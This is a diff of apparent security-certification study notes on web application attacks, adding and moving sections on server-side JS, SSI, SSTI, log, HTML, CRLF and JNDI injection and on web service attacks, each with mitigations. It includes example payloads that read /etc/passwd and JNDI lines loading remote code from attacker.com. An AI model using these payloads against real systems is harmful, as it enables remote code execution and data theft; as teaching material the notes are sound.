@@ -5848,8 +5848,6 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 					- Modify the value to a lower price (e.g., <input type="hidden" name="PRICE" value="2.00">).
 					- Save the modified HTML file locally and open it in a browser.
 					- Click the Buy button to submit the altered price, effectively committing electronic shoplifting.
-		- Cookie Snooping
-		- RC4 NOMORE Attack
 		- Same-Site Attack:
 			- A same-site attack, also known as a related-domain attack, occurs when an attacker targets a subdomain of a trusted organization and redirects users to a malicious web page under their control. Attackers often exploit misconfigured or abandoned subdomains to execute this attack.
 			- Common top-level domains (TLDs) such as .edu, .com, and .org often have multiple subdomains, some of which may be left unused or improperly configured. Attackers take advantage of these vulnerabilities to hijack legitimate websites and create dangling records using extended TLDs (eTLDs). Websites that share the same eTLD+1 domain are classified as same sites, making them potential targets for same-site attacks.
@@ -5966,6 +5964,92 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 				- Disable Detailed Error Messages – Prevent attackers from learning LDAP query structures.
 				- Monitor and Log LDAP Queries – Detect suspicious activity early.
 			- By enforcing strict input validation and secure query handling, organizations can prevent LDAP injection attacks and secure their directory services.
+		- Other Injection Attacks:
+			- Several other types of injection attacks exist, each exploiting different vulnerabilities in web applications and servers.
+			- Server-Side JavaScript (JS) Injection:
+				- Server-side JavaScript injection vulnerabilities occur when an application inserts user-controlled values into a string that is later evaluated dynamically by the server’s JavaScript interpreter. Attackers exploit improper validation of user input to modify the executed code, compromising application functionality and data. Additionally, attackers can use a compromised server as a launchpad for further attacks within the target network.
+				- Example of Server-Side JavaScript Injection:
+					- Attackers can cause a Denial of Service (DoS) attack by passing commands to the eval() function: while (1);
+					- This command forces the server’s event loop to use all processor resources, preventing it from handling further inputs until the process is restarted.
+					- Attackers can also read files from the server:
+						- res.end(require('fs').readdirSync('.').toString());
+						- res.end(require('fs').readdirSync('..').toString());
+					- Once file names are obtained, they can read file contents: res.end(require('fs').readFileSync('filename'));
+				- Furthermore, attackers can execute malicious binaries using the fs and child_process modules, leading to remote code execution (RCE).
+			- Server-Side Includes (SSI) Injection:
+				- Server-Side Includes (SSI) is a feature that allows developers to dynamically generate web page content using directives such as file includes, CGI variables, and shell commands. Once evaluated, the directives are replaced with the corresponding content before the final HTML is sent to users.
+				- Example of SSI Injection:
+					- Consider an application using the following directives:
+						<!--#include virtual="/footer.html" -->
+						<!--#echo var="DATE_LOCAL" -->
+					- If the application does not sanitize user input, attackers can inject malicious SSI directives: <!--#exec cmd="cat /etc/passwd" -->
+					- This command allows the attacker to retrieve sensitive system files, modify or delete server files, and execute arbitrary shell commands.
+			- Server-Side Template Injection (SSTI):
+				- Web applications often use template engines to separate business logic from data presentation. SSTI occurs when unsanitized user input is embedded into templates, allowing attackers to inject malicious template directives that can execute arbitrary code.
+				- Example of Server-Side Template Injection:
+					- Consider the following vulnerable PHP template:
+						<html>
+						<head><title>{{title}}</title></head>
+						<body>
+							<form method="{{method}}" action="{{action}}">
+								<input type="text" name="user" value="{{username}}">
+								<input type="password" name="pwd" value="">
+								<button type="submit">Submit</button>
+							</form>
+							<p>This page took {{microtime(true) - time}} seconds to render.</p>
+						</body>
+						</html>
+					- An attacker could inject a payload such as: {{ system('cat /etc/passwd') }}
+					- If the application processes this template, the attack results in remote code execution.
+			- Log Injection:
+				- Log injection occurs when unvalidated user input is written to application logs, allowing attackers to insert misleading or malicious log entries. This technique can be used to cover attack traces or manipulate system monitoring.
+				- Example of Log Injection:
+					- A typical log format: Date, Time, Username, ID, Source IP, Request
+					- An attacker manipulates the id parameter to inject malicious log entries: id=\r\n (Fake input)
+					- If the log system does not properly sanitize input, an attacker may also inject null bytes (%00) to truncate logs or hide activity.
+			- HTML Injection:
+				- HTML injection occurs when an attacker injects HTML code into a web page through unsanitized input fields. Unlike JavaScript injection (XSS), HTML injection focuses on modifying page content rather than executing scripts.
+				- Example of HTML Injection:
+					- Consider an application displaying search results:
+						<h1>Results matching your query:</h1>
+						<h2>{user_query}</h2>
+						<ol>
+							<li>Result A</li>
+							<li>Result B</li>
+						</ol>
+					- An attacker submits: </h2><a href="http://malicious-site.com">Click here for a special offer!</a><h2>
+					- This modifies the page: <h2></h2><a href="http://malicious-site.com">Click here for a special offer!</a><h2>
+					- If users click the malicious link, they may be redirected to a phishing site or malware download.
+			- Carriage Return Line Feed (CRLF) Injection:
+				- CRLF injection occurs when attackers insert carriage return (\r) and line feed (\n) characters into application input. This can be exploited for log manipulation, HTTP response splitting, and HTTP request smuggling.
+				- Example of CRLF Injection:
+					- A normal log entry: 10.10.10.10 - 09:25 - /index.php?page=about
+					- An attacker submits: /index.php?page=about&%0d%0a127.0.0.1 - 09:25 - /index.php?page=admin
+					- This results in a forged log entry, making it appear that the administrator accessed a page they never actually visited.
+			- Java Naming and Directory Interface (JNDI) Injection:
+				- JNDI is a Java API used for looking up objects in directory services such as LDAP, DNS, and RMI. JNDI injection occurs when an attacker tricks the application into resolving a remote, malicious object, leading to remote code execution (RCE).
+				- Example of JNDI Injection:
+					- A vulnerable Java method:
+						@RequestMapping("/lookup")
+						public Object lookup(@RequestParam String name) throws Exception {
+							return new javax.naming.InitialContext().lookup(name);
+						}
+					- An attacker provides: ldap://attacker.com/maliciousObject
+					- If the application fetches and executes the object, the attacker gains full control over the server.
+				- Another example:
+					Registry registry = LocateRegistry.createRegistry(1097);
+					Reference ref = new javax.naming.Reference("ExploitClass", "ExploitClass", "http://attacker.com/");
+					ReferenceWrapper refWrap = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+					registry.bind("Object", refWrap);
+				- Here, the malicious Java class is hosted remotely and executed by the vulnerable application.
+			- Mitigation Strategies:
+				- To protect against these injection attacks, organizations should:
+				- Validate and Sanitize Input – Reject or properly escape special characters.
+				- Use Parameterized Queries – Avoid direct user input in queries.
+				- Disable Dynamic Code Execution – Prevent eval(), exec(), or similar functions.
+				- Implement Content Security Policies (CSP) – Restrict unsafe content.
+				- Limit Error Disclosure – Hide error messages that expose application logic.
+				- Regular Security Audits – Continuously test for vulnerabilities.
 		- Cross-Site Scripting (XXS):
 			- Cross-site scripting (XSS or CSS) attacks exploit vulnerabilities in dynamically generated web pages, allowing malicious attackers to inject client-side scripts into web pages viewed by other users. These attacks occur when unvalidated input data is included in dynamic content sent to a user's web browser for rendering.
 			- Attackers inject malicious JavaScript, VBScript, ActiveX, HTML, or Flash into legitimate requests to execute harmful actions on a victim's system. By bypassing client-side security mechanisms, attackers gain unauthorized privileges and inject malicious scripts into web pages. These scripts can even rewrite the HTML content of a website.
@@ -6023,8 +6107,6 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 						- Bypassing Whitespace Restrictions: <img/src="popup.jpg"onload=&#x6A;avascript:eval(alert('XSS Attack!'))>
 						- Skipping <href> Attributes: <a onmousedown="alert(document.cookie)">Visit xyz.com</a>
 			- Conclusion: XSS attacks exploit vulnerabilities in web applications to steal data, hijack sessions, and execute malicious actions on users' browsers. Attackers continuously develop evasion techniques to bypass security filters, making proper input validation, encoding, and browser security configurations essential for preventing XSS attacks.
-		- Buffer Overflow
-		- Business Logic Bypass Attack
 		- Web-Based Timing Attacks:
 			- A web-based timing attack is a type of side-channel attack in which attackers retrieve sensitive information, such as passwords, from web applications by measuring the server's response time. These attacks exploit side-channel leakage and estimate the time taken for secret key operations. Different types of web-based timing attacks include direct timing attacks, cross-site timing attacks, and browser-based timing attacks.
 			- Direct Timing Attack:
@@ -6040,8 +6122,6 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 				- Cache Storage Timing Attack:
 					- The Cache API allows developers to store, retrieve, and delete responses, providing access to cached resources. Since loading resources from disk takes time based on the file size, attackers can estimate this time to determine the response size.
 			- After measuring the time taken for processing using the techniques mentioned above, attackers can launch additional attacks, such as brute-force attacks, to extract more information.
-		- CAPTCHA Attacks
-		- Platform Exploits
 		- XML External Entity (XXE) Attack:
 			- An XML External Entity (XXE) attack is a type of Server-Side Request Forgery (SSRF) attack that occurs when an application parses XML input from an untrusted source due to a misconfigured XML parser. In this attack, an attacker sends malicious XML input containing a reference to an external entity to the target web application. If the application uses a weakly configured XML parser, it processes the malicious input and allows the attacker to access protected files and services on the server or connected networks.
 			- Since XML has widely available features, attackers abuse these capabilities to dynamically create documents or files during the parsing process. XXE attacks can be highly damaging, allowing attackers to:
@@ -6217,8 +6297,87 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 					- Validate Input Data – Implement strict input validation to prevent injection attacks.
 					- Implement Signature-Based Integrity Checks – Verify serialized data integrity using cryptographic signatures.
 					- Use Sandboxing and Least Privilege – Run deserialization in an isolated, restricted environment to limit damage.
-		- Denial-of-Service (DoS)
-		- Web Service Attacks
+		- Web Service Attacks:
+			- Web services enable direct interaction with web applications without requiring a browser or user session. As businesses increasingly rely on web services, they introduce new attack vectors that can be exploited by cybercriminals.
+			- Web services are built using XML-based protocols, such as:
+				- Web Services Description Language (WSDL) – Defines connection points for web services.
+				- Universal Description, Discovery, and Integration (UDDI) – Facilitates the discovery of available web services.
+				- Simple Object Access Protocol (SOAP) – Enables communication between web services.
+			- These protocols, while essential for functionality, can be vulnerable to web application threats. Since web service definitions are publicly available, attackers can analyze them to fingerprint the system and craft targeted attacks.
+			- Examples of Web Service Attacks:
+				- Injection Attack:
+					- An attacker injects a malicious script into a web service, allowing them to disclose or modify application data.
+				- Order Manipulation Attack:
+					- An attacker exploits a web service used for processing orders.
+					- They manipulate the request payload to modify the order quantity and status.
+					- For example, an attacker orders 10 units of a product but injects a script that modifies the confirmation page to reflect a smaller quantity (e.g., 2 units).
+					- The system processes the order and ships 10 units, but the records show only 2 units were shipped—allowing the attacker to receive more products than they paid for.
+			- Mitigation Strategies:
+				- Input Validation & Sanitization – Prevent injection attacks by validating all inputs in web services.
+				- Secure API Authentication & Authorization – Implement strong authentication methods (e.g., OAuth, API keys).
+				- Use XML Security Best Practices – Prevent XML External Entity (XXE) attacks and SOAP-based exploits.
+				- Monitor and Log API Activity – Track suspicious behavior and block malicious requests in real time.
+		- Web Service Footprinting Attack:
+			- Attackers use the Universal Business Registry (UBR) as a key resource for gathering information about web services. UBR is a public registry that operates based on UDDI (Universal Description, Discovery, and Integration) specifications and SOAP (Simple Object Access Protocol). It functions similarly to a Whois server, allowing attackers to extract valuable data about registered businesses and their web services.
+			- UDDI Information Structures:
+				- When registering web services on a UDDI server, businesses or organizations typically use the following structures:
+				- businessEntity: Contains company details, including the business name and contact information.
+				- businessService: Represents a logical group of one or more web services. Each businessService is a subset of a businessEntity and provides technical and descriptive details about the web services.
+				- bindingTemplate: Defines a single web service and includes technical details required for client applications to bind and interact with the service. It is a subset of businessService.
+				- technicalModel (tModel): Acts as keyed metadata that represents unique concepts or constructs within UDDI.
+			- By footprinting a web application, attackers can extract any or all of these UDDI structures to map the target's web services environment and plan further attacks.
+			- Example of Web Service Footprinting via XML Query and XML Response:
+				- Attackers often send XML queries to UDDI servers to extract information about web services. The example of an XML request sent via SOAP to query information about Amazon's web services. If the target system is vulnerable, the attacker receives a response containing detailed information about the web services associated with the queried business (e.g., Amazon). XML Response (Data Extracted by Attacker).
+			- Key Takeaways:
+				- Attackers can extract sensitive web service details using UDDI-based footprinting techniques.
+				- Exposed UDDI service structures (businessEntity, businessService, bindingTemplate, tModel) provide attackers with reconnaissance data.
+				- If security measures are not in place, attackers can gather technical data on web services and craft more advanced exploits.
+			- Mitigation Strategies:
+				- Restrict UDDI Access – Ensure UDDI registries are private or require authentication to prevent unauthorized access.
+				- Implement Secure API Gateways – Use API authentication mechanisms (e.g., OAuth, API keys) to restrict queries.
+				- Disable Unused Web Services – Prevent exposure of unnecessary services that could be exploited.
+				- Monitor and Log Web Service Queries – Track suspicious access patterns and block unauthorized footprinting attempts.
+		- Web Service XML Poisoning:
+			- XML poisoning is similar to an SQL injection attack but has a higher success rate in a web service framework. Attackers insert malicious XML code into SOAP requests to perform XML node manipulation or XML schema poisoning, which can disrupt XML parsing logic and break execution processes.
+			- By exploiting XML external entity (XXE) references, attackers can gain unauthorized access to arbitrary files, establish TCP connections, and execute further web service attacks. XML poisoning enables attackers to:
+				- Launch Denial-of-Service (DoS) attacks by overloading XML parsers.
+				- Compromise sensitive information by manipulating XML-based data exchanges.
+				- Disrupt web services by altering parsing mechanisms such as SAX (Simple API for XML) and DOM (Document Object Model).
+			- Since web services rely on XML for data exchange, attackers can poison traffic between servers and applications by injecting malicious XML documents to alter data processing and execution flows.
+			- Example: XML Request vs. Poisoned XML Request
+				- Legitimate XML Request:
+					- The following valid XML request is used to retrieve customer records:
+						<CustomerRecord>
+							<CustomerNumber>2010</CustomerNumber>
+							<FirstName>Jason</FirstName>
+							<LastName>Springfield</LastName>
+							<Address>Apt 20, 3rd Street</Address>
+							<Email>jason@springfield.com</Email>
+							<PhoneNumber>6325896325</PhoneNumber>
+						</CustomerRecord>
+				- Poisoned XML Request:
+					- In a malicious attack, the attacker injects duplicate or malformed XML nodes, potentially confusing the server's XML parser and causing unexpected behavior or security vulnerabilities:
+						<CustomerRecord>
+							<CustomerNumber>2010</CustomerNumber>
+							<FirstName>Jason</FirstName>
+							<CustomerNumber>2010</CustomerNumber>
+							<FirstName>Jason</FirstName>
+							<LastName>Springfield</LastName>
+							<Address>Apt 20, 3rd Street</Address>
+							<Email>jason@springfield.com</Email>
+							<PhoneNumber>6325896325</PhoneNumber>
+						</CustomerRecord>
+			- Impact of XML Poisoning Attacks:
+				- Bypassing authentication – Attackers may manipulate XML structures to trick authentication mechanisms.
+				- Data manipulation – Attackers alter request data to modify transactions or extract confidential information.
+				- Denial-of-Service (DoS) – XML schema manipulation can crash servers by overloading parsers.
+				- External entity injection (XXE attacks) – Malformed XML can be used to access restricted files or open TCP connections.
+			- Mitigation Strategies:
+				- Use Secure XML Parsers – Implement XML libraries that disable external entity processing (XXE).
+				- Validate XML Schema – Ensure that XML requests strictly follow a defined schema and reject malformed requests.
+				- Sanitize User Input – Filter out unexpected XML elements and validate all input before processing.
+				- Limit XML Depth and Size – Restrict nested XML elements and set size limits to prevent DoS attacks.
+				- Use Strong Authentication – Ensure that web services require authentication tokens to verify requests.
 		- Injecting an SSRF Payload
 		- Cross-Site Port Attack (XSPA)
 		- DNS Rebinding Attack
@@ -6230,89 +6389,10 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 		- Network Access Attacks
 		- DMZ Protocol Attacks
 		- MarioNet Attack
-		- Other Injection Attacks:
-			- Several other types of injection attacks exist, each exploiting different vulnerabilities in web applications and servers.
-			- Server-Side JavaScript (JS) Injection:
-				- Server-side JavaScript injection vulnerabilities occur when an application inserts user-controlled values into a string that is later evaluated dynamically by the server’s JavaScript interpreter. Attackers exploit improper validation of user input to modify the executed code, compromising application functionality and data. Additionally, attackers can use a compromised server as a launchpad for further attacks within the target network.
-				- Example of Server-Side JavaScript Injection:
-					- Attackers can cause a Denial of Service (DoS) attack by passing commands to the eval() function: while (1);
-					- This command forces the server’s event loop to use all processor resources, preventing it from handling further inputs until the process is restarted.
-					- Attackers can also read files from the server:
-						- res.end(require('fs').readdirSync('.').toString());
-						- res.end(require('fs').readdirSync('..').toString());
-					- Once file names are obtained, they can read file contents: res.end(require('fs').readFileSync('filename'));
-				- Furthermore, attackers can execute malicious binaries using the fs and child_process modules, leading to remote code execution (RCE).
-			- Server-Side Includes (SSI) Injection:
-				- Server-Side Includes (SSI) is a feature that allows developers to dynamically generate web page content using directives such as file includes, CGI variables, and shell commands. Once evaluated, the directives are replaced with the corresponding content before the final HTML is sent to users.
-				- Example of SSI Injection:
-					- Consider an application using the following directives:
-						<!--#include virtual="/footer.html" -->
-						<!--#echo var="DATE_LOCAL" -->
-					- If the application does not sanitize user input, attackers can inject malicious SSI directives: <!--#exec cmd="cat /etc/passwd" -->
-					- This command allows the attacker to retrieve sensitive system files, modify or delete server files, and execute arbitrary shell commands.
-			- Server-Side Template Injection (SSTI):
-				- Web applications often use template engines to separate business logic from data presentation. SSTI occurs when unsanitized user input is embedded into templates, allowing attackers to inject malicious template directives that can execute arbitrary code.
-				- Example of Server-Side Template Injection:
-					- Consider the following vulnerable PHP template:
-						<html>
-						<head><title>{{title}}</title></head>
-						<body>
-							<form method="{{method}}" action="{{action}}">
-								<input type="text" name="user" value="{{username}}">
-								<input type="password" name="pwd" value="">
-								<button type="submit">Submit</button>
-							</form>
-							<p>This page took {{microtime(true) - time}} seconds to render.</p>
-						</body>
-						</html>
-					- An attacker could inject a payload such as: {{ system('cat /etc/passwd') }}
-					- If the application processes this template, the attack results in remote code execution.
-			- Log Injection:
-				- Log injection occurs when unvalidated user input is written to application logs, allowing attackers to insert misleading or malicious log entries. This technique can be used to cover attack traces or manipulate system monitoring.
-				- Example of Log Injection:
-					- A typical log format: Date, Time, Username, ID, Source IP, Request
-					- An attacker manipulates the id parameter to inject malicious log entries: id=\r\n (Fake input)
-					- If the log system does not properly sanitize input, an attacker may also inject null bytes (%00) to truncate logs or hide activity.
-			- HTML Injection:
-				- HTML injection occurs when an attacker injects HTML code into a web page through unsanitized input fields. Unlike JavaScript injection (XSS), HTML injection focuses on modifying page content rather than executing scripts.
-				- Example of HTML Injection:
-					- Consider an application displaying search results:
-						<h1>Results matching your query:</h1>
-						<h2>{user_query}</h2>
-						<ol>
-							<li>Result A</li>
-							<li>Result B</li>
-						</ol>
-					- An attacker submits: </h2><a href="http://malicious-site.com">Click here for a special offer!</a><h2>
-					- This modifies the page: <h2></h2><a href="http://malicious-site.com">Click here for a special offer!</a><h2>
-					- If users click the malicious link, they may be redirected to a phishing site or malware download.
-			- Carriage Return Line Feed (CRLF) Injection:
-				- CRLF injection occurs when attackers insert carriage return (\r) and line feed (\n) characters into application input. This can be exploited for log manipulation, HTTP response splitting, and HTTP request smuggling.
-				- Example of CRLF Injection:
-					- A normal log entry: 10.10.10.10 - 09:25 - /index.php?page=about
-					- An attacker submits: /index.php?page=about&%0d%0a127.0.0.1 - 09:25 - /index.php?page=admin
-					- This results in a forged log entry, making it appear that the administrator accessed a page they never actually visited.
-			- Java Naming and Directory Interface (JNDI) Injection:
-				- JNDI is a Java API used for looking up objects in directory services such as LDAP, DNS, and RMI. JNDI injection occurs when an attacker tricks the application into resolving a remote, malicious object, leading to remote code execution (RCE).
-				- Example of JNDI Injection:
-					- A vulnerable Java method:
-						@RequestMapping("/lookup")
-						public Object lookup(@RequestParam String name) throws Exception {
-							return new javax.naming.InitialContext().lookup(name);
-						}
-					- An attacker provides: ldap://attacker.com/maliciousObject
-					- If the application fetches and executes the object, the attacker gains full control over the server.
-				- Another example:
-					Registry registry = LocateRegistry.createRegistry(1097);
-					Reference ref = new javax.naming.Reference("ExploitClass", "ExploitClass", "http://attacker.com/");
-					ReferenceWrapper refWrap = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
-					registry.bind("Object", refWrap);
-				- Here, the malicious Java class is hosted remotely and executed by the vulnerable application.
-			- Mitigation Strategies:
-				- To protect against these injection attacks, organizations should:
-				- Validate and Sanitize Input – Reject or properly escape special characters.
-				- Use Parameterized Queries – Avoid direct user input in queries.
-				- Disable Dynamic Code Execution – Prevent eval(), exec(), or similar functions.
-				- Implement Content Security Policies (CSP) – Restrict unsafe content.
-				- Limit Error Disclosure – Hide error messages that expose application logic.
-				- Regular Security Audits – Continuously test for vulnerabilities.
+		- Cookie Snooping
+		- RC4 NOMORE Attack
+		- Buffer Overflow
+		- Business Logic Bypass Attack
+		- CAPTCHA Attacks
+		- Platform Exploits
+		- Denial-of-Service (DoS)
